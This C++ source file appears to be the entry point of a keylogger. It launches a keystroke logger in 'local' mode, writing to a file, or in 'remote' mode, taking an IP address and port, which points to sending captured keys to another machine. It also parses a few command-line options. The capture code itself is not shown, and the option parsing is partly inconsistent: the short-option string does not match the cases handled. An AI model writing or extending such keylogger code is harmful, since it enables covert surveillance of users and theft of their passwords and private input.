#include "./main.hpp"

keylogger* g_keylogger;

int main(int argc, char** argv)
{
	if(argc < 2)
	{
		cerr << "Wrong argument(s)" << endl;
		print_help();
	}

	if(strcasecmp(argv[1], "local") == 0)
	{
		if(argc < 3)
		{
			cerr << "Wrong argument(s)" << endl;
			print_help();
		}

		g_keylogger = new keylogger_local();
		reinterpret_cast<keylogger_local*>(g_keylogger)->initialize(argv[2]);
	}
	else
	{
		if(argc < 4)
		{
			cerr << "Wrong argument(s)" << endl;
			print_help();
		}
		g_keylogger = new keylogger_remote();
		reinterpret_cast<keylogger_remote*>(g_keylogger)->initialize(argv[2], stoi(argv[3]));
	}

	initialize_options(argc, argv);

	g_keylogger->start();

	return 0;
}


void initialize_options(int argc, char** argv)

{
     int t_result_option = 0;
     int t_option_index = 0;
     struct option t_long_options[] =
     {
          {"help", 0, NULL, 0},
		  {"maximum_buffer_size", required_argument, NULL, 0},
          {NULL, 0, NULL, 0}
     };

     while ((t_result_option = getopt_long(argc, argv, ":h:c:p:",
     t_long_options, &t_option_index)) != -1)
     {
          switch(t_result_option)
          {
               case 0:
					if(strcasecmp(t_long_options[t_option_index].name, LONG_OPTION_NO_CLICK) == 0)
					{

					}
					else if(strcasecmp(t_long_options[t_option_index].name, LONG_OPTION_NO_ARROW) == 0)
					{

					}
					else if(strcasecmp(t_long_options[t_option_index].name, LONG_OPTION_ASCII_ONLY) == 0)
					{

					}
					else if(strcasecmp(t_long_options[t_option_index].name, LONG_OPTION_MAXIMUM_BUFFER_SIZE) == 0)
					{
						g_keylogger->a_buffer_maximum_size = atoi(optarg);
					}
					else if(strcasecmp(t_long_options[t_option_index].name, LONG_OPTION_HELP) == 0)
					{
						print_help();
					}
               break;

               case 'h':
               case 'H':
            	   print_help();
			   break;

               case 's':
               case 'S':
            	   g_keylogger->a_buffer_maximum_size = atoi(optarg);
			   break;
          }
     }
}

void print_help()
{
	cout << "main.out <mode> : local | remote" << endl;
	cout << "\tlocal : <file>" << endl;
	cout << "\tremote : <ip> <port>" << endl;

	exit(1);
}
